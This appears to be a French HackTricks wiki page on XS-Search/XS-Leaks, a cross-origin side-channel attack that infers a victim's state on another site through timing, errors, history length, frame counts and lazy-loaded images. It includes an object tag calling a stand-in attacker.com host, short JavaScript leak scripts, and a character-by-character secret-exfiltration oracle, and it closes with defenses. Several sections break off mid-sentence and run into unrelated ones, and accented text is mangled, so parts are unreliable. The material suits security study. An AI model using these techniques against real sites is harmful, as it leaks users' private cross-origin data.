## XS-Search/XS-Leaks

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Acc√©dez-y d√®s aujourd'hui :

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>‚òÅÔ∏è HackTricks Cloud ‚òÅÔ∏è</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>üê¶ Twitter üê¶</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>üéôÔ∏è Twitch üéôÔ∏è</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>üé• Youtube üé•</strong></a></summary>

* Travaillez-vous dans une **entreprise de cybers√©curit√©** ? Voulez-vous voir votre **entreprise annonc√©e dans HackTricks** ? ou voulez-vous avoir acc√®s √† la **derni√®re version de PEASS ou t√©l√©charger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* D√©couvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* **Rejoignez le** [**üí¨**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**üê¶**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR au** [**repo hacktricks**](https://github.com/carlospolop/hacktricks) **et au** [**repo hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## **Informations de base**

XS-Search est une technique orient√©e vers l'exfiltration d'informations entre domaines en exploitant des attaques de canal lat√©ral.

Il existe diff√©rents √©l√©ments dans ce type d'attaque :

* **Web vuln√©rable** : c'est le site web √† partir duquel nous voulons exfiltrer des informations
* **Web de l'attaquant** : c'est le site web que l'attaquant cr√©e contenant l'exploit et que la victime acc√®de
* **M√©thode d'inclusion** : c'est la m√©thode utilis√©e pour charger le Web vuln√©rable √† partir du Web de l'attaquant (comme window.open, iframe, fetch, balise HTML avec href...)
* **Technique de fuite** : apr√®s avoir acc√©d√© au site vuln√©rable, une technique sera utilis√©e pour diff√©rencier les √©tats potentiels du site avec les informations obtenues √† partir de la m√©thode d'inclusion utilis√©e.
* **√âtats** : les 2 √©tats possibles que le site vuln√©rable peut avoir en fonction de la victime que nous voulons diff√©rencier.
* **Diff√©rences d√©tectables** : il s'agit des informations que l'attaquant doit essayer de d√©cider de l'√©tat du site vuln√©rable.

### Diff√©rences d√©tectables

Afin de distinguer entre les 2 √©tats de la page vuln√©rable, plusieurs √©l√©ments peuvent √™tre examin√©s :

* **Code d'√©tat**. Un attaquant peut distinguer les **diff√©rents codes d'√©tat de r√©ponse HTTP** entre domaines (par exemple, les erreurs serveur, les erreurs client ou les erreurs d'authentification).
* **Utilisation de l'API**. Cette diff√©rence d√©tectable permet √† un attaquant de d√©tecter l'**utilisation des API Web** sur les pages, ce qui permet √† un attaquant de d√©duire si une page entre domaines utilise une API Web JavaScript sp√©cifique.
* **Redirections**. Il est possible de d√©tecter si une application Web a **navigu√© l'utilisateur vers une page diff√©rente**. Cela ne se limite pas aux redirections HTTP, mais inclut √©galement les redirections d√©clench√©es par JavaScript ou HTML.
* **Contenu de la page**. Ces diff√©rences d√©tectables **apparaissent dans le corps de la r√©ponse HTTP** ou dans les sous-ressources incluses par la page. Par exemple, cela pourrait √™tre le **nombre de frames incluses
```html
<object data="//example.com/404">
  <object data="//attacker.com/?error"></object>
</object>
```
Dans ce cas, si `example.com/404` n'est pas trouv√©, `attacker.com/?error` sera charg√©.

### Timing de l'√©v√©nement onload

* **M√©thodes d'inclusion**: √âl√©ments HTML
* **Diff√©rence d√©tectable**: Timing (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events)
* **R√©sum√©**: L'API \*\*\*\* [**performance.now()**](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. Cependant, d'autres horloges pourraient √™tre utilis√©es, telles que l'API [**PerformanceLongTaskTiming**](https://developer.mozilla.org/en-US/docs/Web/API/PerformanceLongTaskTiming) qui peut identifier les t√¢ches s'ex√©cutant pendant plus de 50 ms.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#onload-events) un autre exemple dans:

{% content-ref url="xs-search/performance.now-example.md" %}
[performance.now-example.md](xs-search/performance.now-example.md)
{% endcontent-ref %}

#### Timing onload + t√¢che lourde forc√©e

Cette technique est similaire √† la pr√©c√©dente, mais l'**attaquant** va √©galement **forcer** une action √† prendre un **temps pertinent** lorsque la **r√©ponse est positive ou n√©gative** et mesurer ce temps.

{% content-ref url="xs-search/performance.now-+-force-heavy-task.md" %}
[performance.now-+-force-heavy-task.md](xs-search/performance.now-+-force-heavy-task.md)
{% endcontent-ref %}

### Timing unload/beforeunload

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: Timing (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)
* **R√©sum√©**: L'horloge [SharedArrayBuffer](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#sharedarraybuffer-and-web-workers) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#unload-events)

Les √©v√©nements [`unload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/unload\_event) et [`beforeunload`](https://developer.mozilla.org/en-US/docs/Web/API/Window/beforeunload\_event) peuvent √™tre utilis√©s pour mesurer le temps n√©cessaire pour r√©cup√©rer une ressource. Cela fonctionne parce que **`beforeunload`** est d√©clench√© lorsque le navigateur **demande une nouvelle navigation**,
### Boucle d'√©v√©nements occup√©e <a href="#busy-event-loop" id="busy-event-loop"></a>

* **M√©thodes d'inclusion** :
* **Diff√©rence d√©tectable** : Timing (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations** : [https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop](https://xsleaks.dev/docs/attacks/timing-attacks/execution-timing/#busy-event-loop)
* **R√©sum√©** : Mesurer le temps d'ex√©cution d'un site web en bloquant la boucle d'√©v√©nements d'un thread et chronom√©trer **le temps qu'il faut pour que la boucle d'√©v√©nements redevienne disponible**.
* **Exemple de code** :

L'un des principaux avantages de cette technique est sa capacit√© √† contourner l'isolation de site, car l'origine de l'attaquant peut influencer l'ex√©cution d'une autre origine.

{% hint style="warning" %}
Dans une mesure de temps d'ex√©cution, il est possible d'**√©liminer les facteurs de r√©seau** pour obtenir des mesures **plus pr√©cises**. Par exemple, en chargeant les ressources utilis√©es par la page avant de la charger.
{% endhint %}

### Pool de connexions

* **M√©thodes d'inclusion** : Requ√™tes JavaScript
* **Diff√©rence d√©tectable** : Timing (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'informations** : [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)
* **R√©sum√©** : Un attaquant pourrait bloquer tous les sockets sauf un, charger la page cible et en m√™me temps charger une autre page, le temps jusqu'√† ce que la derni√®re page commence √† se charger est le temps que la page cible a pris pour se charger.
* **Exemple de code** :

{% content-ref url="xs-search/connection-pool-example.md" %}
[connection-pool-example.md](xs-search/connection-pool-example.md)
{% endcontent-ref %}

Les navigateurs utilisent des sockets pour communiquer avec les serveurs. Comme le syst√®me d'exploitation et le mat√©riel sur lequel il s'ex√©cute ont des ressources limit√©es, **les navigateurs doivent imposer une limite**. Pour exploiter l'existence de cette limite, les attaquants peuvent :

1. V√©rifier quelle est la limite du navigateur, par exemple 256 sockets globaux.
2. Bloquer 255 sockets pendant une longue p√©riode en effectuant 255 requ√™tes vers des h√¥tes diff√©rents qui suspendent simplement la connexion.
3. Utiliser le 256√®me socket en effectuant une requ√™te vers la page cible.
4. Effectuer une 257√®me requ√™te vers un autre h√¥te. √âtant donn√© que tous les sockets sont utilis√©s (aux √©tapes 2 et 3), cette requ√™te doit attendre que le pool re√ßoive un socket disponible. Cette p√©riode d'attente fournit √† l'attaquant le timing r√©seau du 256√®me socket, qui appartient √† la page cible. Cela fonctionne parce que les 255 sockets de l'√©tape 2 sont toujours bloqu√©s, donc si le pool a re√ßu un socket disponible, c'est √† cause de la lib√©ration du socket de l'√©tape 3. Le temps de lib√©ration du 256√®me socket est directement li√© au temps n√©cessaire pour terminer la requ√™te.

Pour plus d'informations : [https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/](https://xsleaks.dev/docs/attacks/timing-attacks/connection-pool/)

### Pool de connexions par destination

* **M√©
### Service Worker

* **M√©thodes d'inclusion**: Frames
* **Diff√©rence d√©tectable**: Utilisation de l'API
* **Plus d'infos**: [https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/](https://www.ndss-symposium.org/ndss-paper/awakening-the-webs-sleeper-agents-misusing-service-workers-for-privacy-leakage/)
* **R√©sum√©**: D√©tecter si un service worker est enregistr√© pour une origine sp√©cifique.
* **Exemple de code**:

Les service workers sont des contextes de script pilot√©s par des √©v√©nements qui s'ex√©cutent sur une origine. Ils s'ex√©cutent en arri√®re-plan d'une page Web et peuvent intercepter, modifier et **mettre en cache des ressources** pour cr√©er une application Web hors ligne.\
Si une **ressource mise en cache** par un **service worker** est acc√©d√©e via un **iframe**, la ressource sera **charg√©e √† partir du cache du service worker**.\
Pour d√©tecter si la ressource a √©t√© **charg√©e √† partir du cache du service worker**, l'API de performance peut √™tre utilis√©e.\
Cela pourrait √©galement √™tre fait avec une attaque de synchronisation (consultez le document pour plus d'informations).

### Cache

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: Timing
* **Plus d'infos**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)
* **R√©sum√©**: D√©tecter si une ressource a √©t√© stock√©e dans le cache.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources), [https://xsinator.com/testing.html#Cache%20Leak%20(POST)](https://xsinator.com/testing.html#Cache%20Leak%20\(POST\))

En utilisant l'API de performance, il est possible de v√©rifier si une ressource est mise en cache.\
Pour plus d'informations: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#detecting-cached-resources)

### Dur√©e du r√©seau

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'infos**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)
* **R√©sum√©**: Il est possible de r√©cup√©rer la dur√©e du r√©seau d'une requ√™te √† partir de l'API `performance`.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration](https://xsleaks.dev/docs/attacks/timing-attacks/performance-api/#network-duration)

## Technique des messages d'erreur

### Erreur de m√©dia

* **M√©thodes d'inclusion**: √âl√©ments HTML (Vid√©o, Audio)
* **Diff√©rence d√©tectable**: Code d'√©tat
* **Plus d'infos**: [https://bugs.chromium.org/p/chromium/issues/detail?id=828265](https://bugs.chromium.org/p/chromium/issues/detail?id=828265)
* **R√©sum√©**: Dans FF, il est possible de divulguer avec pr√©cision le code d'√©tat d'une requ√™te cross-origin.
* **Exemple de code**: [https://jsbin.com/nejatopusi/1/edit?html,css,js,output](https://jsbin.com/nejatopusi/1/edit?html,css,js,output)
```javascript
// Code saved here in case it dissapear from the link
// Based on MDN MediaError example: https://mdn.github.io/dom-examples/media/mediaerror/
window.addEventListener("load", startup, false);
function displayErrorMessage(msg) {
  document.getElementById("log").innerHTML += msg;
}

function startup() {
  let audioElement = document.getElementById("audio");
 // "https://mdn.github.io/dom-examples/media/mediaerror/assets/good.mp3";
  document.getElementById("startTest").addEventListener("click", function() {
    audioElement.src = document.getElementById("testUrl").value;
  }, false);
  // Create the event handler
  var errHandler = function() {
    let err = this.error;    
    let message = err.message;
    let status = "";
    
    // Chrome error.message when the request loads successfully: "DEMUXER_ERROR_COULD_NOT_OPEN: FFmpegDemuxer: open context failed"
    // Firefox error.message when the request loads successfully: "Failed to init decoder"
    if((message.indexOf("DEMUXER_ERROR_COULD_NOT_OPEN") != -1) || (message.indexOf("Failed to init decoder") != -1)){
      status = "Success";
    }else{
      status = "Error";
    }
    displayErrorMessage("<strong>Status: " + status + "</strong> (Error code:" + err.code + " / Error Message: " + err.message + ")<br>");
  };
  audioElement.onerror = errHandler;
}
```
La propri√©t√© message de l'interface **`MediaError`** contient une **cha√Æne diff√©rente pour les ressources qui se chargent avec succ√®s**. Cela permet √† un attaquant d'inf√©rer le statut de r√©ponse pour une ressource cross-origin.

### Erreur CORS

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: En-t√™te
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **R√©sum√©**: Dans SA, les messages d'erreur CORS divulguent l'URL compl√®te des redirections.
* **Exemple de code**: [https://xsinator.com/testing.html#CORS%20Error%20Leak](https://xsinator.com/testing.html#CORS%20Error%20Leak)

Cette technique permet √† un attaquant de divulguer la cible d'une redirection initi√©e par un site cross-origin.

CORS permet aux ressources web accessibles publiquement d'√™tre lues et utilis√©es √† partir de n'importe quel site web. Dans les navigateurs bas√©s sur Webkit, il est possible d'**acc√©der aux messages d'erreur CORS lorsque la requ√™te CORS √©choue**. Un attaquant peut envoyer une requ√™te activ√©e par CORS √† un site cible qui **redirige** en fonction de l'√©tat de l'utilisateur. Lorsque le navigateur refuse la requ√™te, l'**URL compl√®te de la cible de la redirection est divulgu√©e** dans le message d'erreur. Avec cette attaque, il est possible de d√©tecter les redirections, de divulguer les emplacements de redirection et les param√®tres de requ√™te sensibles.

### Erreur SRI

* **M√©thodes d'inclusion**: Fetch API
* **Diff√©rence d√©tectable**: En-t√™te
* **Plus d'informations**: [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf) (5.3)
* **R√©sum√©**: Dans SA, les messages d'erreur SRI divulguent la taille des r√©ponses cross-origin en raison de messages d'erreur verbeux.
* **Exemple de code**: [https://xsinator.com/testing.html#SRI%20Error%20Leak](https://xsinator.com/testing.html#SRI%20Error%20Leak)

Un attaquant peut divulguer la taille des r√©ponses cross-origin en raison de **messages d'erreur verbeux**.

L'attribut d'int√©grit√© d√©finit un hachage cryptographique par lequel le navigateur peut v√©rifier qu'une ressource r√©cup√©r√©e n'a pas √©t√© manipul√©e. Ce m√©canisme de s√©curit√© s'appelle Subresource Integrity (SRI). Il est utilis√© pour la v√©rification d'int√©grit√© des ressources servies √† partir de r√©seaux de diffusion de contenu (CDN). Pour √©viter les fuites de donn√©es, les ressources cross-origin doivent √™tre **activ√©es par CORS**. Sinon, la r√©ponse n'est pas √©ligible √† la validation d'int√©grit√©. Tout comme la fuite XS-Leak d'erreur CORS, il est possible de capturer le **message d'erreur apr√®s une demande fetch avec un attribut d'int√©grit√© qui √©choue**. Un attaquant peut d√©clencher **forc√©ment** cette **erreur** sur n'importe quelle demande en sp√©cifiant une **valeur de hachage bidon**. Dans SA, ce message d'erreur divulgue la longueur du contenu de la ressource demand√©e. Un attaquant peut utiliser cette fuite pour d√©tecter les diff√©rences de taille de r√©ponse, ce qui permet des attaques XS-Leak puissantes.

### Violation/D√©tection de CSP

* **M√©thodes d'inclusion**: Pop-ups
* **Diff√©rence d√©tectable**:
### Longueur maximale de l'URL - C√¥t√© client

* **M√©thodes d'inclusion**: Pop-ups
* **Diff√©rence d√©tectable**: Code d'√©tat / Contenu
* **Plus d'informations**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)
* **R√©sum√©**: D√©tecter les diff√©rences dans les r√©ponses en raison de la longueur de la r√©ponse de redirection qui pourrait √™tre trop grande pour une demande qu'une diff√©rence peut √™tre remarqu√©e.
* **Exemple de code**: [https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit](https://ctf.zeyu2001.com/2023/hacktm-ctf-qualifiers/secrets#unintended-solution-chromes-2mb-url-limit)

Selon la [documentation de Chromium](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), la longueur maximale de l'URL de Chrome est de 2 Mo.

> En g√©n√©ral, la _plateforme web_ n'a pas de limites sur la longueur des URL (bien que 2^31 soit une limite courante). _Chrome_ limite les URL √† une longueur maximale de **2 Mo** pour des raisons pratiques et pour √©viter de causer des probl√®mes de d√©ni de service dans la communication inter-processus.

Par cons√©quent, si l'URL de redirection r√©pond est plus grande dans l'un des cas, il est possible de la faire rediriger avec une URL plus grande que 2 Mo pour atteindre la limite de longueur. Lorsque cela se produit, Chrome affiche une page **`about:blank#blocked`**.

La diff√©rence remarquable est que si la redirection a √©t√© termin√©e, `window.origin` lance une erreur car une origine crois√©e ne peut pas acc√©der √† cette information. Cependant, si la limite a √©t√© atteinte et que la page charg√©e √©tait **`about:blank#blocked`**, l'origine de la fen√™tre reste celle du parent, qui est une information accessible.

Toutes les informations suppl√©mentaires n√©cessaires pour atteindre les 2 Mo peuvent √™tre ajout√©es via un **hash** dans l'URL initiale afin qu'il soit utilis√© dans la redirection.

{% content-ref url="xs-search/url-max-length-client-side.md" %}
[url-max-length-client-side.md](xs-search/url-max-length-client-side.md)
{% endcontent-ref %}

### Nombre maximal de redirections

* **M√©thodes d'inclusion**: API Fetch, Frames
* **Diff√©rence d√©tectable**: Code d'√©tat
* **Plus d'informations**: [https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76](https://docs.google.com/presentation/d/1rlnxXUYHY9CHgCMckZsCGH4VopLo4DYMvAcOltma0og/edit#slide=id.g63edc858f3\_0\_76)
* **R√©sum√©**: Abuser de la limite de redirection pour d√©tecter les redirections.
* **Exemple de code**: [https://xsinator.com/testing.html#Max%20Redirect%20Leak](https://xsinator.com/testing.html#Max%20Redirect%20Leak)

Si le nombre maximal de redirections √† suivre d'un navigateur est de 20, un attaquant pourrait essayer de charger sa page avec 19 redirections et finalement envoyer la victime vers la page test√©e. Si une erreur est d√©clench√©e, alors la page essayait de rediriger la victime.

### Longueur de l'historique

* **M√©thodes d'inclusion**: Frames, Pop-ups
* **Diff√©rence d√©tectable**: Redirections
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/navigations/](https://xsleaks.dev/docs/attacks/navigations/)
* **R√©sum√©**: Le code JavaScript manipule l'historique du navigateur et peut √™tre acc√©d√© par la propri√©t√© de longueur.
* **Exemple de code**: [https://xsinator.com/testing.html#History%20Length%20Leak](https://xsinator.com/testing.html#History%20Length%20Leak)

L'API History permet au code JavaScript de manipuler l'historique du navigateur, qui enregistre les pages visit√©es par un utilisateur. Un attaquant peut utiliser la propri√©t√© de longueur comme m√©thode d'inclusion : pour d√©tecter la navigation JavaScript et HTML.\
En v√©rifiant `history.length`, en faisant naviguer un utilisateur vers une page, en la changeant de nouveau vers la m√™me origine et en v√©rifiant la nouvelle valeur de `history.length`.

### Longueur de l'historique avec la m√™me URL

* **M√©thodes d'inclusion**: Frames, Pop-ups
* **Diff√©rence d√©tectable**: Si l'URL est identique √† celle devin√©e
* **R√©sum√©**: Il est possible de deviner si l'emplacement d'une frame/pop-up est dans une URL sp√©cifique en abusant de la longueur de l'historique.
* **Exemple de code**: ci-dessous

Un attaquant pourrait utiliser du code JavaScript pour manipuler l'emplacement de la frame/pop-up vers une URL devin√©e et la changer imm√©diatement en `about:blank`. Si la longueur de l'historique a augment√©, cela signifie que l'URL √©tait correcte et qu'elle avait le temps d'augmenter car l'URL n'est pas recharg√©e si elle est identique. Si elle n'a pas augment√©, cela signifie qu'elle a essay√© de charger l'URL devin√©e mais parce que nous avons imm√©diatement charg√© `about:blank` apr√®s, la longueur de l'historique n'a jamais augment√© lors du chargement de l'URL devin√©e.
```javascript
async function debug(win, url) {
    win.location = url + '#aaa';
    win.location = 'about:blank';
    await new Promise(r => setTimeout(r, 500));
    return win.history.length;
}

win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=c"));

win.close();
win = window.open("https://example.com/?a=b");
await new Promise(r => setTimeout(r, 2000));
console.log(await debug(win, "https://example.com/?a=b"));
```
### Comptage de cadres

* **M√©thodes d'inclusion**: Cadres, Pop-ups
* **Diff√©rence d√©tectable**: Contenu de la page
* **Plus d'informations**: [https://xsleaks.dev/docs/attacks/frame-counting/](https://xsleaks.dev/docs/attacks/frame-counting/)
* **R√©sum√©**: Lire le nombre de cadres (window.length).
* **Exemple de code**: [https://xsinator.com/testing.html#Frame%20Count%20Leak](https://xsinator.com/testing.html#Frame%20Count%20Leak)

Le comptage du **nombre de cadres dans une page web** ouverte via `iframe` ou `window.open` peut aider √† identifier le **statut de l'utilisateur sur cette page**.\
De plus, si la page a toujours le m√™me nombre de cadres, la v√©rification **continue** du nombre de cadres peut aider √† identifier un **mod√®le** qui pourrait divulguer des informations.

Un exemple de cette technique est que dans Chrome, un **PDF** peut √™tre **d√©tect√©** avec le **comptage de cadres
### Temps de r√©cup√©ration

* **M√©thodes d'inclusion**: API Fetch
* **Diff√©rence d√©tectable**: Temps (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'infos**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)
* **R√©sum√©**: L'API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te. D'autres horloges pourraient √™tre utilis√©es.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#modern-web-timing-attacks)

### Temps entre fen√™tres

* **M√©thodes d'inclusion**: Pop-ups
* **Diff√©rence d√©tectable**: Temps (g√©n√©ralement d√ª au contenu de la page, au code d'√©tat)
* **Plus d'infos**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)
* **R√©sum√©**: L'API [performance.now()](https://xsleaks.dev/docs/attacks/timing-attacks/clocks/#performancenow) peut √™tre utilis√©e pour mesurer le temps n√©cessaire pour effectuer une requ√™te en utilisant `window.open`. D'autres horloges pourraient √™tre utilis√©es.
* **Exemple de code**: [https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks](https://xsleaks.dev/docs/attacks/timing-attacks/network-timing/#cross-window-timing-attacks)

![](<../.gitbook/assets/image (9) (1) (2).png>)

\
Utilisez [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) pour cr√©er et **automatiser facilement des workflows** aliment√©s par les outils communautaires les plus avanc√©s au monde.\
Obtenez l'acc√®s aujourd'hui:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## Avec HTML ou R√©injection

Ici, vous pouvez trouver des techniques pour exfiltrer des informations √† partir d'un HTML de source crois√©e en **injectant du contenu HTML**. Ces techniques sont int√©ressantes dans les cas o√π, pour une raison quelconque, vous pouvez **injecter du HTML mais vous ne pouvez pas injecter de code JS**.

### Balisage en suspens

{% content-ref url="dangling-markup-html-scriptless-injection.md" %}
[dangling-markup-html-scriptless-injection.md](dangling-markup-html-scriptless-injection.md)
{% endcontent-ref %}

### Chargement paresseux d'images

Si vous devez **exfiltrer du contenu** et que vous pouvez **ajouter du HTML avant le secret**, vous devriez v√©rifier les **techniques de balisage en suspens courantes**.\
Cependant, si pour une raison quelconque vous **DEVEZ** le faire **caract√®re par caract√®re** (peut-√™tre que la communication se fait via un cache hit), vous pouvez utiliser cette astuce.

Les **images** dans HTML ont un attribut "**loading**" dont la valeur peut √™tre "**lazy**". Dans ce cas, l'image sera charg√©e lorsqu'elle sera affich√©e et non pendant le chargement de la page:
```html
<img src=/something loading=lazy >
```
Par cons√©quent, ce que vous pouvez faire est d'**ajouter beaucoup de caract√®res inutiles** (par exemple, des milliers de "W") pour **remplir la page web avant le secret**. Nous faisons cela pour que l'image ne soit pas charg√©e au d√©but.

Cependant, vous pouvez faire **acc√©der le bot √† la page** avec quelque chose comme
```
#:~:text=SECR
```
Donc la page web ressemblera √† quelque chose comme: **`https://victim.com/post.html#:~:text=SECR`**

O√π post.html contient les caract√®res ind√©sirables de l'attaquant et l'image de chargement paresseux, puis le secret du bot est ajout√©.

Ce que ce texte fera, c'est de faire acc√©der le bot √† n'importe quel texte de la page qui contient le texte `SECR`. Comme ce texte est le secret et qu'il est juste **en dessous de l'image**, l'**image ne se chargera que si le secret devin√© est correct**. Vous avez donc votre oracle pour **exfiltrer le caract√®re secret par caract√®re**.

Un exemple de code pour exploiter cela: [https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e](https://gist.github.com/jorgectf/993d02bdadb5313f48cf1dc92a7af87e)

Trouvez **un autre exemple d'utilisation du chargement paresseux** ici:

{% content-ref url="xs-search/event-loop-blocking-+-lazy-images.md" %}
[event-loop-blocking-+-lazy-images.md](xs-search/event-loop-blocking-+-lazy-images.md)
{% endcontent-ref %}

### ReDoS

{% content-ref url="regular-expression-denial-of-service-redos.md" %}
[regular-expression-denial-of-service-redos.md](regular-expression-denial-of-service-redos.md)
{% endcontent-ref %}

### CSS ReDoS

Si `jQuery(location.hash)` est utilis√©, il est possible de savoir via le temps si un contenu HTML existe, cela est d√ª au fait que si le s√©lecteur `main[id='site-main']` ne correspond pas, il n'a pas besoin de v√©rifier le reste des **s√©lecteurs**:
```javascript
$("*:has(*:has(*:has(*)) *:has(*:has(*:has(*))) *:has(*:has(*:has(*)))) main[id='site-main']")
```
### Injection de CSS

{% content-ref url="xs-search/css-injection/" %}
[injection-de-css](xs-search/css-injection/)
{% endcontent-ref %}

## D√©fenses

Dans cette section, vous pouvez trouver une partie des mesures d'att√©nuation recommand√©es dans [https://xsinator.com/paper.pdf](https://xsinator.com/paper.pdf). Cependant, il y a plus de mesures d'att√©nuation dans chaque section du wiki [https://xsleaks.dev/](https://xsleaks.dev/). Consultez-le pour plus d'informations sur la fa√ßon de se prot√©ger contre ces techniques.

### Mesures d'att√©nuation de la m√©thode d'inclusion

* **√âl√©ments HTML**. Il peut utiliser l'en-t√™te **CORP pour contr√¥ler si les pages peuvent int√©grer une ressource**. CORP peut √™tre d√©fini sur m√™me origine ou m√™me site et bloque respectivement les demandes de ressources crois√©es ou de site crois√© √† cette ressource. Du c√¥t√© **client**, les navigateurs bas√©s sur Chromium utilisent l'algorithme **CORB** pour d√©cider si les demandes de ressources crois√©es doivent √™tre autoris√©es ou refus√©es.
* **Cadres**. La principale d√©fense pour **emp√™cher les √©l√©ments iframe** de charger des ressources HTML est l'utilisation de **X-Frame-Options**. Alternativement, la directive CSP frame-ancestors peut atteindre un r√©sultat similaire. Si l'int√©gration est refus√©e, la m√©thode d'inclusion ne peut pas d√©tecter de diff√©rence dans les r√©ponses.
* **Pop-ups**. Pour restreindre l'acc√®s √† `window.opener`, l'en-t√™te de r√©ponse HTTP **COOP** d√©finit trois valeurs diff√©rentes : unsafe-none (par d√©faut), same-origin-allow-popups et same-origin. Ces valeurs peuvent √™tre utilis√©es pour **isoler les onglets de navigation et les pop-ups** et ainsi att√©nuer les techniques de fuite bas√©es sur les pop-ups.
* **Demandes JavaScript**. Les demandes JavaScript de source crois√©e sont souvent utilis√©es dans les attaques XS-Leak, car un attaquant a un contr√¥le pr√©cis sur la demande √©mise. Cependant, comme ces demandes ne sont pas activ√©es par CORS, elles sont soumises aux m√™mes restrictions que les demandes envoy√©es par des √©l√©ments HTML, tels que des scripts ou des images. Ainsi, l'impact de cette technique de fuite peut √©galement √™tre **att√©nu√© par CORP et CORB**.

M√©thodes plus g√©n√©riques :

